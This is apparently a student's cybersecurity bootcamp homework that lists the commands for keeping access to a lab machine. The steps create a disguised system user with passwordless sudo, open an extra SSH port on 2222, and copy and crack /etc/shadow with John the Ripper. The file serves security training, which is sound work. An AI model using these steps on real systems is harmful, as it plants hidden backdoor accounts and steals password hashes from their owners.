## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    ```
    adduser sysd --no-create-home
    ```


2. Give your secret user a password: 
    - `hack0rz'

3. Give your secret user a system UID < 1000:
    ```
    usermod -u 200 sysd
    ```

4. Give your secret user the same GID:
    ```
    groupmod -g 200 sysd
    ```

5. Give your secret user full `sudo` access without the need for a password:
    ```
    visudo
  
    ```
    - gain access to sudoers file to edit and add the following line:

        - sysd  ALL=(ALL) NOPASSWD:ALL

6. Test that `sudo` access works without your password:
    - su to sysd user profile
    ```
    sudo su sysd
    whoami
    sudo -l
    ```

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    ```
    nano /etc/ssh/sshd_config
    ```
    - once inside the config file, added the following uncommented line under Port 22
        - **Port 2222**
    - also uncommented Port 22 so that both ports are open then configured the firewall to allow port 2222 access to SSH
    ```
    ufw allow 2222/tcp
    ```
    - restarted the sshd service
    ```
     systemctl restart sshd
    ```
    - confirmed status of sshd service
    ```
    systemctl status sshd
    ```
    - confirmed server was now listening on port 22 and port 2222.
    
**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    ```
    systemctl restart sshd
    ```

2. Exit the `root` account:
    ```
    exit
    ```

3. SSH to the target machine using your `sysd` account and port `2222`:
    ```
    ssh sysd@192.168.6.105 -p 2222
    ```

4. Use `sudo` to switch to the root user:
    ```
    sudo su
    ```

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:
    ```
    ssh sysd@192.168.6.105 -p 2222
    ```


2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:
    - escalate priveleges
    ```
    sudo su
    ```
    - once I am root, copied the /etc/shadow file to the tmp directory
    ```
    cat /etc/shadow > /tmp/shadow.txt
    ```
    - Ran john the ripper on the shadow.txt file.
    ```
    john /tmp/shadow.txt
    ```

---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

